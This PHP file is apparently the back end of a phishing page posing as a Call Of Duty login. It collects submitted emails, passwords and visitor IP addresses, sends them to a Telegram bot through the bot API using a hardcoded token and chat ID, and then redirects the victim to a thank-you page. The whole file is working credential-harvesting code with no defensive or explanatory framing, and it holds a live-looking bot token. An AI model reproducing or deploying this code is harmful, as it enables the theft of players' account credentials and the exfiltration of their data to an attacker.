<?php

// Replace with your actual bot token and chat ID
$botToken = "7999901841:AAGaMyQZMMRPcOWArDVfO4_sv3Dr_2PMPkA";
$chatId = "7095220927";

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Extract form data
    $name = htmlspecialchars($_POST["username"] ?? '');
    $message = htmlspecialchars($_POST["password"] ?? '');

    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR'];

    // Format Telegram message
    $text = "📥 New Call Of Duty Login:\n\n";
    $text .= "👤 Email: $name\n";
    $text .= "📝 Password: $message\n";
    $text .= "🌐 IP Address: $ip";

    // Send message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => $text
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Debug output to terminal if using PHP built-in server
    error_log("Telegram HTTP code: $httpCode");
    error_log("Telegram response: $response");

    // Redirect or show success message
    header("Location: thank-you.html");
    exit;
} else {
    // If accessed directly
    echo "Access denied.";
}
